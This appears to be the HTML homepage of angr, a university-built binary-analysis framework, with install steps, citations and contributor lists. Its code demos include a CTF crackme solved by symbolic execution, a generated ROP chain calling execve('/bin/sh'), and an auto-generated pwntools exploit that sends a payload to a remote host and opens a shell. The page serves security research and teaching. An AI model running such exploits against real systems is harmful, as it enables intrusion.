@@ -1,0 +1,392 @@
+<!DOCTYPE rowhtm>
+<html>
+<head>
+	<meta name="generator" content="Hugo 0.39" />
+  <link rel="stylesheet" href="https://nilocunger.github.io/css/main.css">
+  <link rel="stylesheet" href="https://nilocunger.github.io/css/syntax.css">
+  <link rel="stylesheet" href="https://nilocunger.github.io/css/pure-min.css">
+  <link rel="stylesheet" href="https://nilocunger.github.io/css/single.css">
+  <style type="text/css">
+    .hidden { display: none; }
+  </style>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script type="text/javascript" src="/js/no_foac.js"></script>
+  <script type="text/javascript" src="/js/clicky.js"></script>
+</head>
+<body>
+<header id="header">
+  <div id="topbar">
+    <div id="title">
+      <a href="https://nilocunger.github.io/" class="nohighlight">
+        angr
+        <img id="logo" src="https://nilocunger.github.io/img/angry_face.png">
+      </a>
+    </div>
+    <ul id="nav">
+      <div id="prompt">&gt;&gt;&gt;</div>
+      
+        <a href="/"><li>home</li></a>
+      
+        <a href="/blog"><li>blog</li></a>
+      
+        <a href="http://docs.angr.io/"><li>docs</li></a>
+      
+        <a href="https://github.com/angr"><li>code</li></a>
+      
+        <a href="/#contact"><li>get involved!</li></a>
+      
+    </ul>
+  </div>
+</header>
+<div id="bodycolumn">
+
+<!DOCTYPE html>
+
+    <div id="announce">
+      We&rsquo;re reviving the angr blog! For a tutorial on extending angr and much more soon, see <a href="/blog">here</a>!
+    </div>
+
+
+
+    <h2>What is angr?</h2>
+    <p>angr is a python framework for analyzing binaries. It combines both static and dynamic symbolic ("concolic") analysis, making it applicable to a variety of tasks.</p>
+
+    <p>As an introduction to angr's capabilities, here are some of the things that you can do using angr and the tools built with it:</p>
+
+    <ul>
+      <li>
+      Control-flow graph recovery.
+      <span>
+        <input type="checkbox" id="cfg-example" class="expand-check">
+        <label for="cfg-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+          <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">angr</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">proj</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s1">&#39;./fauxware&#39;</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">cfg</span> <span class="o">=</span> <span class="n">proj</span><span class="o">.</span><span class="n">analyses</span><span class="o">.</span><span class="n">CFG</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="nb">dict</span><span class="p">(</span><span class="n">proj</span><span class="o">.</span><span class="n">kb</span><span class="o">.</span><span class="n">functions</span><span class="p">)</span>
+<span class="p">{</span><span class="il">4195552L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">_init</span> <span class="p">(</span><span class="mh">0x4004e0</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195600L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="n">puts</span> <span class="p">(</span><span class="mh">0x400510</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195616L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="n">printf</span> <span class="p">(</span><span class="mh">0x400520</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195632L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="n">read</span> <span class="p">(</span><span class="mh">0x400530</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195648L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="n">__libc_start_main</span> <span class="p">(</span><span class="mh">0x400540</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195664L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="n">strcmp</span> <span class="p">(</span><span class="mh">0x400550</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195680L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="nb">open</span> <span class="p">(</span><span class="mh">0x400560</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195696L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">plt</span><span class="o">.</span><span class="nb">exit</span> <span class="p">(</span><span class="mh">0x400570</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195712L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">_start</span> <span class="p">(</span><span class="mh">0x400580</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195756L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">call_gmon_start</span> <span class="p">(</span><span class="mh">0x4005ac</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195904L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">frame_dummy</span> <span class="p">(</span><span class="mh">0x400640</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4195940L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">authenticate</span> <span class="p">(</span><span class="mh">0x400664</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4196077L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">accepted</span> <span class="p">(</span><span class="mh">0x4006ed</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4196093L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">rejected</span> <span class="p">(</span><span class="mh">0x4006fd</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4196125L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">main</span> <span class="p">(</span><span class="mh">0x40071d</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4196320L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">__libc_csu_init</span> <span class="p">(</span><span class="mh">0x4007e0</span><span class="p">)</span><span class="o">&gt;</span><span class="p">,</span>
+ <span class="il">4196480L</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">Function</span> <span class="n">__do_global_ctors_aux</span> <span class="p">(</span><span class="mh">0x400880</span><span class="p">)</span><span class="o">&gt;</span><span class="p">}</span>
+</code></pre></div>
+        </div>
+      </span>
+      <li>
+      Symbolic execution.
+      <span>
+        <input type="checkbox" id="symexec-example" class="expand-check">
+        <label for="symexec-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+            <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">os</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">angr</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">project</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s2">&#34;defcamp_quals_2015_r100&#34;</span><span class="p">,</span> <span class="n">auto_load_libs</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">path_group</span> <span class="o">=</span> <span class="n">project</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">path_group</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">path_group</span><span class="o">.</span><span class="n">explore</span><span class="p">(</span><span class="n">find</span><span class="o">=</span><span class="k">lambda</span> <span class="n">path</span><span class="p">:</span> <span class="s1">&#39;Nice!&#39;</span> <span class="ow">in</span> <span class="n">path</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">posix</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="n">path_group</span><span class="o">.</span><span class="n">found</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">state</span><span class="o">.</span><span class="n">posix</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">Code_Talkers</span>
+</code></pre></div>
+            <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./defcamp_quals_2015_r100
+Enter the password: Code_Talkers
+Nice!
+</code></pre></div>
+        </div>
+      </span>
+      <li>
+      Automatic ROP chain building using <a href="http://github.com/salls/angrop">angrop</a>.
+      <span>
+        <input type="checkbox" id="rop-example" class="expand-check">
+        <label for="rop-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+            <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">angr</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">angrop</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">project</span> <span class="o">=</span> <span class="n">angr</span><span class="o">.</span><span class="n">Project</span><span class="p">(</span><span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="n">auto_load_libs</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">rop</span> <span class="o">=</span> <span class="n">project</span><span class="o">.</span><span class="n">analyses</span><span class="o">.</span><span class="n">ROP</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">rop</span><span class="o">.</span><span class="n">find_gadgets</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">print_payload_code</span><span class="p">()</span>
+<span class="n">chain</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4929bc</span><span class="p">)</span>  <span class="c1"># pop rax; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x702fb8</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x420b5c</span><span class="p">)</span>  <span class="c1"># pop rsi; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x68732f6e69622f</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4a382a</span><span class="p">)</span>  <span class="c1"># mov qword ptr [rax + 8], rsi; xor eax, eax; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4929bc</span><span class="p">)</span>  <span class="c1"># pop rax; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x3b</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41e844</span><span class="p">)</span>  <span class="c1"># pop rdi; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x702fc0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4ed076</span><span class="p">)</span>  <span class="c1"># pop rdx; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x420b5c</span><span class="p">)</span>  <span class="c1"># pop rsi; ret</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x401b94</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+<span class="n">chain</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
+</code></pre></div>
+        </div>
+      </span>
+      <li>
+      Automatically binaries hardening using <a href="http://github.com/shellphish/patcherex">patcherex</a>.
+      <span>
+        <input type="checkbox" id="patcherex-example" class="expand-check">
+        <label for="patcherex-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+            <div class="highlight"><pre class="chroma">$ patcherex/patch_master.py single test_binaries/CADET_00003 stackretencryption CAD ET_00003_stackretencryption
+</pre></div>
+        </div>
+      </span>
+      <li>
+      Automatic exploit generation (for DECREE and simple Linux binaries) using <a href="http://github.com/shellphish/rex">rex</a>.
+      <span>
+        <input type="checkbox" id="rex-example" class="expand-check">
+        <label for="rex-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+            <div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">rex</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">rex</span><span class="o">.</span><span class="n">Crash</span><span class="p">(</span><span class="s2">&#34;vuln_stacksmash&#34;</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mi">227</span><span class="p">)</span><span class="o">.</span><span class="n">exploit</span><span class="p">()</span><span class="o">.</span><span class="n">arsenal</span><span class="p">[</span><span class="s2">&#34;rop_to_system&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">script</span><span class="p">(</span><span class="s2">&#34;x.py&#34;</span><span class="p">)</span>
+
+<span class="err">$</span> <span class="n">cat</span> <span class="n">x</span><span class="o">.</span><span class="n">py</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s2">&#34;</span><span class="si">%s</span><span class="s2">:  &#34;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xde\x82\x04\x08\x10\x83\x04\x08\xf2\x82\x04\x08\x00\x00\x00\x00\x1f\xa0\x04\x08\x08\x00\x00\x00\xde\x82\x04\x08\x83\x04\x08\xf5\x82\x04\x08\x1f\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="o">.</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+        </div>
+      </span>
+      <li>
+      Use <a href="https://github.com/angr/angr-management">angr-management</a>, a (very alpha state!) GUI for angr, to analyze binaries!
+      <span>
+        <input type="checkbox" id="am-example" class="expand-check">
+        <label for="am-example"> <div class="show-more">show code</div> <div class="show-less">hide code</div> </label>
+        <div class="expandable">
+            <div class="highlight"><pre class="chroma">angr-management/run-docker.sh
+</pre></div>
+        </div>
+      </span>
+      <li>
+      Achieve cyber-autonomy in the comfort of your own home, using <a href="http://shellphish.net/cgc/#tools">Mechanical Phish</a>, the third-place winner of the DARPA Cyber Grand Challenge.
+    </ul>
+
+		<p>angr itself is made up of several subprojects, all of which can be used separately in other projects:
+    <ul>
+      <li>an executable and library loader, <a href="https://github.com/angr/cle">CLE</a></li>
+      <li>a library describing various architectures, <a href="https://github.com/angr/archinfo">archinfo</a></li>
+      <li>a Python wrapper around the binary code lifter VEX, <a href="https://github.com/angr/pyvex">PyVEX</a></li>
+	  	<li>a data backend to abstract away differences between static and symbolic domains, <a href="https://github.com/angr/claripy">Claripy</a></li>
+	  	<li>the program analysis suite itself, <a href="https://github.com/angr/angr">angr</a></li>
+    </ul>
+
+    <h2>How do I use angr?</h2>
+    <p>angr installs through pip! We recommend installing it in a virtualenv:</p>
+    <div class="highlight"><pre class="chroma">$ mkvirtualenv angr
+$ pip install angr
+</pre></div>
+    <p>We also provide a docker container:</p>
+    <div class="highlight"><pre class="chroma">$ docker run -it angr/angr
+</pre></div>
+
+    <h2>How do I learn?</h2>
+    <p>There are a few resources you can use to help you get up to speed!</p>
+
+      <ul>
+        <li>Check out <a href="/blog">the blog</a>! We're slowly adding many useful examples, tutorials, and walkthroughs there.
+        <li>Documentation and walk-throughs available in <a href="http://docs.angr.io">e-book form</a> and <a href="https://github.com/angr/angr-doc">repository form</a>, including ready-to-run <a href="https://github.com/angr/angr-doc/blob/master/docs/examples.md">examples</a>
+        <li>The <a href="api-doc">API reference</a>
+        <li>The presentations from angr's debut at <a href="https://docs.google.com/presentation/d/1t7KaCMc73z7WdV7EcL0z9TSHlT_kjdMdSrPHtpA6ezc/edit#slide=id.p">DEFCON 23</a> <a href="https://www.youtube.com/watch?v=oznsT-ptAbk">(video)</a> and <a href="https://docs.google.com/presentation/d/1kwObiKZsPSpxM0uZByzeRTaLC7RS1E2C7UR6HxD7Y1Y/edit#slide=id.p4">Blackhat 2015</a> <a href="https://youtu.be/Fi_S2F7ud_g">(video)</a>
+        <li>Presentations discussing Shellphish's use of angr in the DARPA Cyber Grand Challenge at <a href="http://cs.ucsb.edu/~antoniob/files/hitcon_2015_public.pdf">HITCON ENT 2015</a>, <a href="https://docs.google.com/presentation/d/1ko1a28XL1nOm6LfqW5fCk6qjFmnhGIATyGDlAnxNcaA/edit#slide=id.p">HITCON CMT 2015</a>, and <a href="https://www.youtube.com/watch?v=l4kmWhYija0">32C3</a> <a href="https://www.youtube.com/watch?v=XGhg19_GXnM">(video)</a>
+    </ul>
+
+    <h2><a name="contact">How do I get involved (or get help)?</a></h2>
+    <p>There are a few resources you can use to help you get up to speed or get you contributing to the project!</p>
+
+      <ul>
+        <li>We primarily use slack for communication, at <a href="http://angr.slack.com">angr.slack.com</a>. You can get an invite <a href="/invite">here</a>.
+        <li>If you want real-time communication but absolutely refuse to use slack, you can hang out in <b>#angr</b> on <a href="https://freenode.net/">freenode</a>. Responsiveness here, realistically, is lower than on slack, unfortunately.
+        <li>You can file an issue or send us a PR on <a href="https://github.com/angr">github</a> in the appropriate repo.
+        <li>If you prefer email, and don't mind longer response times, shoot an email to angr-at-lists.cs.ucsb.edu. This is a <b>public</b> mailing list (to which you can subscribe <a href="https://lists.cs.ucsb.edu/mailman/listinfo/angr">here</a>).
+    </ul>
+
+    <p>In all this, please keep in mind that angr is a large project being frantically worked on by a very small group of overworked students. It's open source, with a typical open source support model (i.e., pray for the best).</p>
+    <p>For an idea of <i>what</i> to help with, check <a href="https://docs.angr.io/HELPWANTED.html">this</a> out.
+
+    <h2>Can angr be used for science?</h2>
+
+    <p>We have used angr heavily in our academic research! If you have used angr or its sub-components in your research, please cite at least the following paper describing it:</p>
+
+    <pre>@inproceedings{shoshitaishvili2016state,
+  title={{SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis}},
+  author={Shoshitaishvili, Yan and Wang, Ruoyu and Salls, Christopher and
+          Stephens, Nick and Polino, Mario and Dutcher, Audrey and Grosen, John and
+          Feng, Siji and Hauser, Christophe and Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={IEEE Symposium on Security and Privacy},
+  year={2016}
+}</pre>
+
+    
+    <div>
+      <input type="checkbox" id="showhide" class="expand-check">
+      <label for="showhide">
+        <div class="show-more" id="show-more-papers">Show more papers</div>
+        <div class="show-less" id="show-more-papers">Show fewer papers</div>
+      </label>
+      <div class="expandable">
+        <p>Additionally, the angr authors and their collaborators have used angr in the following publications:</p>
+
+<pre>
+@inproceedings{bao2017your,
+  title={{Your Exploit is Mine: Automatic Shellcode Transplant for Remote Exploits}},
+  author={Bao, Tiffany and Wang, Ruoyu and Shoshitaishvili, Yan and Brumley, David},
+  booktitle={IEEE Symposium on Security and Privacy},
+  year={2017}
+}
+
+@inproceedings{machiry2017boomerang,
+  title={{BOOMERANG: Exploiting the Semantic Gap in Trusted Execution Environments}},
+  author={Machiry, Aravind and Gustafson, Eric and Spensky, Chad and Salls, Christopher
+          and Stephens, Nick and Wang, Ruoyu and Bianchi, Antonio and Choe, Yung Ryn and
+          Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
+  year={2017}
+}
+
+@inproceedings{wang2017ramblr,
+  title={{Ramblr: Making Reassembly Great Again}},
+  author={Wang, Ruoyu and Shoshitaishvili, Yan and Bianchi, Antonio and Aravind, Machiry
+          and Grosen, John and Grosen, Paul and Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={Proceedings of the 2017 Network and Distributed System Security Symposium},
+  year={2017}
+}
+
+@misc{shellphish-phrack,
+  title={Cyber Grand Shellphish},
+  author={Shellphish},
+  note={\url{http://phrack.org/papers/cyber_grand_shellphish.html}},
+  year={2017},
+}
+
+@inproceedings{stephens2016driller,
+  title={{Driller: Augmenting Fuzzing Through Selective Symbolic Execution}},
+  author={Stephens, Nick and Grosen, John and Salls, Christopher and Dutcher, Audrey and
+          Wang, Ruoyu and Corbetta, Jacopo and Shoshitaishvili, Yan and
+          Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={Proceedings of the 2016 Network and Distributed System Security Symposium},
+  year={2016}
+}
+
+@inproceedings{shoshitaishvili2015firmalice,
+  title={{Firmalice - Automatic Detection of Authentication Bypass Vulnerabilities
+         in Binary Firmware}},
+  author={Shoshitaishvili, Yan and Wang, Ruoyu and Hauser, Christophe and
+          Kruegel, Christopher and Vigna, Giovanni},
+  booktitle={Proceedings of the 2015 Network and Distributed System Security Symposium},
+  year={2015}
+}</pre>
+
+    <p>Finally, angr (or its subcomponents) have been used in many other academic works:</p>
+
+<pre>
+@article{parvez2016combining,
+  title={{Combining Static Analysis and Targeted Symbolic Execution for Scalable
+         Bug-finding in Application Binaries}},
+  author={Parvez, Muhammad Riyad},
+  year={2016},
+  publisher={University of Waterloo}
+}
+
+@inproceedings{pewny2015cross,
+  title={{Cross-Architecture Bug Search in Binary Executables}},
+  author={Pewny, Jannik and Garmany, Behrad and Gawlik, Robert and Rossow, Christian
+          and Holz, Thorsten},
+  booktitle={Security and Privacy (SP), 2015 IEEE Symposium on},
+  pages={709--724},
+  year={2015},
+  organization={IEEE}
+}
+
+@inproceedings{vogl2014dynamic,
+  title={{Dynamic hooks: hiding control flow changes within non-control data}},
+  author={Vogl, Sebastian and Gawlik, Robert and Garmany, Behrad and Kittel, Thomas
+          and Pfoh, Jonas and Eckert, Claudia and Holz, Thorsten},
+  booktitle={23rd USENIX Security Symposium (USENIX Security 14)},
+  pages={813--328},
+  year={2014}
+}
+</pre>
+      </div>
+    </div>
+
+
+    <p>Semi-academically, angr was one of the underpinnings of Shellphish's Cyber Reasoning System for the DARPA Cyber Grand Challenge, enabling them to win third place in the final round (more info <a href="http://shellphish.net/cgc">here</a>)! Shellphish has also used angr in many CTFs.</p>
+
+    <h2>Who works on angr?</h2>
+    <p>angr is worked on by several researchers in the <a href="http://seclab.cs.ucsb.edu">Computer Security Lab at UC Santa Barbara</a>. Core developers (arbitrarily, 1000+ lines of code!) include:</p>
+    <ul>
+      <li>Ruoyu (Fish) Wang</li>
+      <li>Audrey Dutcher</li>
+      <li>Lukas Dresel</li>
+      <li>Eric Gustafson</li>
+      <li>Nilo Redini</li>
+      <li>Paul Grosen</li>
+      <li>Colin Unger</li>
+      <li>Chris Salls</li>
+      <li>Nick Stephens</li>
+      <li>Christophe Hauser</li>
+      <li>John Grosen</li>
+      <li>Yan Shoshitaishvili</li>
+    </ul>
+
+    <p>angr would never have happened if it were not for the vision, wisdom, guidance, and support of our professors:</p>
+    <ul>
+      <li>Christopher Kruegel</li>
+      <li>Giovanni Vigna</li>
+    </ul>
+
+    <p>Additionally, there are <i>many</i> open-source contributors, which you can see at
+    <a href="https://github.com/angr/angr/graphs/contributors">the</a>
+    <a href="https://github.com/angr/claripy/graphs/contributors">various</a>
+    <a href="https://github.com/angr/cle/graphs/contributors">repositories</a>
+    <a href="https://github.com/angr/pyvex/graphs/contributors">in</a>
+    <a href="https://github.com/angr/archinfo/graphs/contributors">the</a>
+    <a href="https://github.com/shellphish/patcherex/graphs/contributors">github</a>
+    <a href="https://github.com/shellphish/rex/graphs/contributors">orgs</a>.
+
+      
+    </div>
+
+<br>
+</div>
+<div id="footer">
+  <p>angr owes its existence to research sponsored by DARPA under agreement number
+  <a href="http://www.darpa.mil/program/vetting-commodity-it-software-and-firmware">N66001-13-2-4039</a>!</p>
+  <p>Site icons provided by <a href="https://www.flaticon.com/authors/icomoon">Icomoon</a> and <a href="http://www.freepik.com">Freepik</a>, licensed by <a href="http://creativecommons.org/licenses/by/3.0/">CC 3.0 BY</a></p>
+  <p>For questions, hop on <a href="http://angr.slack.com">our slack</a> (get an invite <a href="/invite">here</a>)
+  or contact the angr mailing list:
+  <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;%61%6e%67%72@%6c%69%73%74%73.%63%73.%75%63%73%62.%65%64%75">angr&nbsp;~at~&nbsp;lists.cs.ucsb.edu</a>
+  </div>
+</body>
+</html>
+
